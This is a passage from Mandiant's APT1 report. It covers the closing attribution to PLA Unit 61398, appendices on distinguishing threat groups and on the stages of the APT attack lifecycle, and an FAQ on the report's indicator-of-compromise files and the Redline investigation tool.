four “home” Shanghai net blocks »\nare assigned to the Pudong New Area\n\n» Systems used by APT1 intruders have »\nSimplified Chinese language settings\n\n» An APT1 persona’s self-identified location »\nis the Pudong New Area\n\n**Infrastructure** » Ready access to four main net blocks in » » Co-building network infrastructure with »\nShanghai, hosted by China Unicom (one of China Telecom in the name of national\ntwo Tier 1 ISPs in China) defense\n\n» Some use of China Telecom IP addresses »\n(the other Tier 1 ISP)\n\nCombining our direct observations with carefully researched and correlated findings; we believe the facts dictate only\ntwo possibilities:\n\n**Either**\n\nA secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based\ntelecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign\nright outside of Unit 61398’s gates, performing tasks similar to Unit 61398’s known mission.\n\n**Or**\n\nAPT1 is Unit 61398.\n\n\n-----\n\n##### Appendix A:  How Does Mandiant  Distinguish Threat Groups?\n\nMandiant uses the term threat _group to refer to a collection of intruders who are working together to target and_\npenetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and\nshare tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is\nultimately defined by people and not by methodology.\n\nHowever, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting\nbehind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the\nsame person, by two people who are working together, by two unrelated people who independently compromised the\nsame network, or even the same computer. Different groups may use similar intrusion methodology and common tools,\nparticularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there\nmay be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing\nof personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a\nprivate citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise\nthe same target.\n\nNevertheless, distinguishing one threat group from another is possible with enough information, analytical experience,\nand the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who\nleaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:\n\n»» The method the thief used to break in;\n\n»» The tools used to open the safe;\n\n»» Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to\ngrab something of value;\n\n»» Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as\nfingerprints; or whether he was not very careful, but simply relied on being “stealthy enough” to not get caught.\n\n\n-----\n\nForensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime\nscene was the result of one thief and not another.\n\nIn a similar way, cyber intruders leave behind various digital “fingerprints.” They may send spear-phishing emails from\na specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have\nspecific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have\ncommand and control IP addresses or domain names embedded. These are just a few examples of the myriad of\nlinkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another.\n\nDigital “fingerprints” do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific\nthreat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as\nHTRAN is not unique and not useful — by itself — as an indicator of a specific threat group. In contrast, the use of\na specific, custom backdoor not observed elsewhere is a much stronger indicator — although it is generally still not\nsufficient, on its own, for positive attribution.\n\nAt the most basic level, we say that two intrusion events are attributed to the same group when we have collected\nenough indicators to show beyond a reasonable doubt that the same person or group of people were involved.\n\n\n-----\n\n##### Appendix B:  APT and the Attack Lifecycle\n\nWhile most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese APT\nlifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages\nof Mandiant’s Attack Lifecycle model and give an overview of what APT activity looks like in each stage. The stages\nbetween “Establish Foothold” and “Complete Mission” do not have to occur in this order every time. In fact, once\nestablished within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying\ndata of interest, moving laterally to access that data, and “completing mission” by stealing the data. This will generally\ncontinue indefinitely until they are removed entirely from the network.\n\n###### Initial Compromise\n\nThe Initial Compromise stage represents the methods that intruders use to penetrate a target organization’s network.\nAPT intruders frequently target individual users within a victim environment. As such, the most commonly observed\nmethod of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to\na malicious file, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims\nand send malicious content via social networking sites or instant messaging. Another common tactic is strategic web\ncompromise, in which the attacker places malicious code on websites that people in targeted organizations will likely\nvisit. When they visit these websites in the course of their normal duties, they will be compromised if their computer\nis vulnerable to the attacker’s exploit code. APT groups may also look for vulnerable Internet-facing web servers and\nupload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in\npublic-facing infrastructure.\n\n###### Establish Foothold\n\nEstablishing a foothold ensures that APT threat groups can access and control one or more computers within the\nvictim organization from outside the network. APT groups can utilize public backdoors (Gh0st RAT and Poison Ivy are\ncommon examples), “underground” backdoors found in hacker websites or obtained through personal connections,\nand “custom” backdoors that they developed themselves. These backdoors usually establish an outbound connection\nfrom the victim network to a computer controlled by the attackers. The communication methods used by the backdoors\nvary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give\nthe APT groups basic access to a system, typically through a command shell or graphical user interface.\n\n\n-----\n\n###### Escalate Privileges\n\nEscalating privileges involves acquiring items that will allow access to more resources within the victim environment.\nMost often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI\ncertificates, VPN client software, privileged computers, or other resources required to access data or systems of\ninterest. APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as\nDomain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user\naccounts. This is typically accomplished by first “dumping” password hashes from a computer, server, or (preferably)\nDomain Controller. The attacker may be able to obtain legitimate account passwords by “cracking” password hashes.\nAlternately, the attacker may leverage the hashes themselves in a “pass-the-hash” attack, where the hashed password\nitself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily\nleveraged for both password dumping and pass-the-hash attacks.\n\n###### Internal Reconnaissance\n\nIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. APT threat\nactors use built-in operating system commands (such as the Windows “net” commands) to obtain information about\nthe internal network, including computers, trust relationships, users, and groups. In order to identify data of interest,\nthey may perform directory or network share listings, or search for data by file extension, key word, or last modified\ndate. Data of interest may take many forms, but most commonly consists of documents, the contents of user email\naccounts, or databases. Therefore file servers, email servers, and domain controllers are customary targets of internal\nreconnaissance. Some APT groups utilize custom scripts in order to automate the process of reconnaissance and\nidentification of data of interest.\n\n###### Move Laterally\n\nIn most cases, the systems that the intruders initially compromise do not contain the data that they want. Therefore\nthey must move laterally within a network to other computers that either contain that data or allow them to access it.\nAPT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and\ndevices inside of a victim network. They commonly use compromised credentials with PsExec and / or the Windows\nTask Scheduler (“at” command) to execute commands and install malware on remote systems.\n\n###### Maintain Presence\n\nIn this stage, the intruders take actions to ensure continued control over key systems in the network environment from\noutside of the network. APT groups often install new backdoors (e.g., different backdoors than the ones installed in the\nEstablish Foothold phase) in the environment during the course of the campaign. They may install different families of\nmalware on multiple computers and use a variety of command and control addresses, presumably for redundancy and\nto make it difficult to identify and remove all of their access points. Additionally, APT groups may establish methods of\nnetwork access that do not involve backdoors, so that they can maintain a presence even if network security personnel\ndiscover and remove their malware. These methods may include the use of valid PKI or VPN credentials, allowing the\nintruders to masquerade as a legitimate user to gain access to a corporate network and internal resources. In some\ninstances APT threat actors have been able to circumvent two-factor authentication to maintain access to a victim\nnetwork and its resources.\n\n\n-----\n\n###### Complete Mission\n\nThe main goal of APT intrusions is to steal data, including intellectual property, business contracts or negotiations,\npolicy papers or internal memoranda. Once APT groups find files of interest on compromised systems, they often pack\nthem into archive files before stealing them. They most commonly use the RAR archiving utility for this task, but may\nalso use other publicly available utilities such as ZIP or 7-ZIP. APT threat actors not only compress data, but frequently\npassword-protect the archive. From there they use a variety of methods to transfer files out of the victim network,\nincluding FTP, custom file transfer tools, or existing backdoors.\n\n\n-----\n\n##### Appendix C (Digital): The Malware Arsenal\n\nThis appendix is digital and can be found at http://www.mandiant.com/apt1.

It includes APT1 SSL certificates used on\nservers that are part of their command and control infrastructure.\n\n\n-----\n\n##### Appendix G (Digital):  IOC s\n\nThe portion of this appendix that includes the Indicators of Compromise (IOCs) is digital and can be found at http://\nwww.mandiant.com/apt1.\n\n###### APT1 Indicators and Using Redline™\n\nWith the release of Mandiant’s report, APT1: Exposing One of China’s Cyber Espionage Units, we are providing a set of\nAPT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal.\nIOCs can be used in investigations to find unknown evils or for detection of already known threats. The IOCs included\nin Appendix G fit the latter; however, keep in mind that APT1 does update their tools, and there are certainly malware\nvariants and new families of malware that will not be detected with this set of IOCs. To find out more about the report or\nthe digital appendices (to include downloading the set of APT1 IOCs in Appendix G: IOCs) go to http://www.mandiant.\ncom/apt1.\n\nIOCs can be used in conjunction with Redline, Mandiant’s free host-based investigative tool, or with Mandiant\nIntelligent Response[®] (MIR), Mandiant’s commercial host-based investigative tool. Mandiant’s customers who have\nlicensed MIR can simply import a zip file of the IOCs into their controllers. For those without MIR, Redline can be\ndownloaded from Mandiant’s web site at http://www.mandiant.com/resources/download/redline.\n\nRemember to always test new IOCs before using them in a production environment.\n\n###### What Are IOCs?\n\nMandiant has developed an open, extendable standard for defining and sharing threat information in a machine-\nreadable format. Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with\ngrouping and logical operators to provide advanced threat detection capability.\n\nIf you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org.\n\n\n-----\n\n###### What Is Redline?\n\nRedline is Mandiant’s free tool for investigating hosts for signs of malicious activity through memory and file analysis,\nand subsequently developing a threat assessment profile. Redline provides several benefits including the following:\n\n###### Rapid Triage\n\nWhen confronted with a potentially compromised host, responders must first assess whether the system has active\nmalware. Without installing software or disrupting the current state of the host, Redline thoroughly audits all currently-\nrunning processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire\nfile structure, network state, and system memory. Redline will also compare any MD5 value it collects, analyzes, and\nvisualizes against an MD5 whitelist. Users can further analyze and view imported audit data using Redline’s Timeline\nfunctionality, which includes capabilities to narrow and filter results around a given timeframe with the TimeWrinkles™\nand TimeCrunches™ features.\n\n###### Reveals Hidden Malware\n\nThe Redline Portable Agent can collect and analyze a complete memory image, working below the level at which\nkernel rootkits and other malware-hiding techniques operate. Many hiding techniques become extremely obvious when\nexamined at the physical memory level, making memory analysis a powerful tool for finding malware. It also reveals\n“memory only” malware that is not present on disk.\n\n###### Guided Analysis\n\nMandiant’s Redline tool streamlines memory analysis by providing a proven workflow for analyzing malware based on\nrelative priority. This takes the guesswork out of task and time allocation, allowing investigators to provide a focused\nresponse to the threats that matter most.\n\nRedline calculates a “Malware Risk Index” that highlights processes more likely to be worth investigating, and\nencourages users to follow investigative steps that suggest how to start. As users review more audits from clean and\ncompromised systems, they build up the experience to recognize malicious activity more quickly.\n\nAs you investigate a system, here’s how Redline will help you focus your attention on the most productive data:\n\n###### Investigative Steps\n\nRedline can collect a daunting amount of raw information. Its investigative steps help provide a starting place by\nhighlighting specific data and providing views that are most commonly productive in identifying malicious processes.\nUnless you are pursuing a specific “lead”, we recommend working through the steps in order, examining the\ninformation for entries that don’t match your expectations.\n\nThe key to becoming an effective investigator is to review Redline data from a variety of “clean” and “compromised”\nsystems. Over time, your sense of which entries are normal and which are of concern will develop quickly as you view\nmore data.\n\n\n-----\n\n###### Malware Risk Index Scoring\n\nRedline analyzes each process and memory section using a variety of rules and techniques to calculate a “Malware\nRisk Index” for each process. This score is a helpful guide to identifying those processes that are more likely to be\nworth investigating. Processes at the highest risk of being compromised by malware are highlighted with a red badge.\nThose with some risk factors have a grey badge, and low-risk processes have no badge.\n\nThe MRI is not an absolute indication of malware. During an investigation you can refine the MRI scoring by adjusting\nspecific hits (identifying false positives and false negatives) for each process, adding your own hits, and generally\ntuning the results.\n\n###### IOCs\n\nRedline provides the option of performing IOC analysis in addition to MRI scoring. Supplied a set of IOCs, the Redline\nPortable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis; after\nthe analysis is run, IOC hit results are available for further investigation.\n\nIn addition, Redline provides the ability to create an IOC Collector. This feature enables the collection of data types\nrequired for matching a set of IOCs.\n\n###### Works with MIR\n\nCombined with MIR, Redline is a powerful tool for accelerated live response. Here’s a typical case:\n\n»» IDS or other system detects suspicious activity on a host\n\n»» From MIR, an investigator launches a remote live response script\n\n»» The MIR Agent running on the host captures and analyzes memory locally, streaming back a small XML audit that\ndownloads in minutes rather than hours\n\n»» From MIR, the user can open the audit directly in Redline\n\n»» Using Redline, the investigator quickly identifies a malicious process, and writes an IOC describing the forensic\nattributes found in Redline\n\n»» Using MIR and MCIC, the investigator is quickly able to sweep for that IOC and discover all other systems on the\nnetwork with the same (or similar) malware running\n\n\n-----\n\n###### Have MIR Customers had Access to these IOCs Before?\n\nThese IOCs are new! However, much of the detection capability in this set of indicators has already been available to\nour MIR customers. The IOCs may look different though as a result of improvements in creation and testing. Mandiant\nstarted 2013 with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the\nsynthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management\nprocess, and IOC testing. The majority of these indicators, or modified versions of them, will be integrated into the next\nIOC release.\n\n###### What Is the FAMILY Designator in This Set of IOCs?\n\nWe are using a new IOC designator in these IOCs called “(FAMILY).” Mandiant’s Threat Intelligence Unit tracks\nmalware by common features seen in groups of binaries. We call those groupings of binaries “families.” The IOCs\nincluded in this appendix are representatives of families of malware used by APT1. The new designator follows the\nfamily name in the “Name” field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole\nfamily, not just one sample.\n\n###### Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From Mandiant?\n\nIn many cases we have combined information that previously would have been in several indicators into a single\nindicator. Additionally, we have removed certain types of intelligence, since they are being released in separate\nappendices (such as FQDNs and IPs).\n\nAdditionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be\ndetected otherwise.\n\n###### What Is a File Permutation block?\n\nIt is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two\npieces. For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.\n\n###### Will You Update These IOCs?\n\nIt is likely that we will make some changes to the IOCs in Appendix G as we get feedback. If updated, the updates will\nbe available in the same location as the report http://www.mandiant.com/apt1.\n\n###### Will You Be Releasing More IOCs Like This?\n\nCurrently, there are no plans for additional public releases of this magnitude.\n\n\n-----\n\n##### Appendix H (Digital): \n Video\n\nThis appendix is digital and can be found at http://www.mandiant.com/apt1. It includes a compilation of videos showing\nactual attacker sessions and their intrusion activities.\n\n\n-----",
